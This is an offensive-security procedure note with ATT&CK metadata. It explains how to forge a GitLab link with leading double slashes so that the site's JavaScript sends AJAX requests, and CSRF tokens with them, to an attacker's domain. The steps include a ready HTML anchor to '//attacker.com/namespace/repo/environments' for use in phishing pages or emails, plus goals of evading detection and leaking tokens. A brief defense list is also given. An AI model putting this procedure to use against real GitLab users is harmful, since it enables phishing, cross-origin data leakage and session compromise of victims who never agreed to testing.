---
tags:
  - url-forgery
  - malicious-link
  - domain-manipulation
type: procedure
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:29.133Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 1fb732dd-df63-404f-adcf-7b0bb947cf59
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
---

# Craft Malicious Link with Double Slashes for Domain Forgery

## Summary

This procedure crafts a forged hyperlink using leading double slashes ('//') to exploit browser URL resolution, tricking GitLab's JavaScript into directing AJAX requests to an attacker-controlled domain while appearing as a relative path.

## Description

Browsers resolve '//path' as an absolute path on the current protocol but allow scheme-less origins, enabling '//attacker.com/path' to become 'https://attacker.com/path'. In GitLab, when combined with `location.pathname`, this manipulates requests to leak data like CSRF tokens to external servers.

## Requirements

1. Control over a domain and web server to host the malicious content
2. Knowledge of the target's namespace/repo structure in GitLab
3. HTML editing capabilities for link creation

## Defense

Defensive measures and detection strategies:

- Sanitize all user-provided URLs to prevent '//' schemes
- Implement strict URL validation in JS before constructing requests
- Log and alert on cross-origin AJAX attempts

## Objectives

1. Create a link that resolves externally without triggering same-origin warnings
2. Mimic GitLab's internal paths to evade detection
3. Prepare for token leakage in subsequent requests

## Instructions

### Step 1: Design the Forged URL Structure

**Context**: Build the link to match GitLab's expected pathname format.

Construct the href as '//attacker.com/namespace/repo/', where 'namespace/repo' mirrors the victim's GitLab project path. This ensures the JS appends correctly to form a full external URL.

### Step 2: Embed in Malicious Content

**Context**: Place the link in a phishing page or email to lure the victim.

Create an HTML snippet: `<a href="//attacker.com/namespace/repo/environments">View Environments</a>`. Host this on the attacker's server.

### Step 3: Verify Resolution Behavior

**Context**: Test how the link behaves in a browser on the GitLab domain.

Visit GitLab, then click the link. Inspect network requests to confirm they target 'https://attacker.com' instead of GitLab.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[url-forgery]]
- [[malicious-link]]
- [[domain-manipulation]]
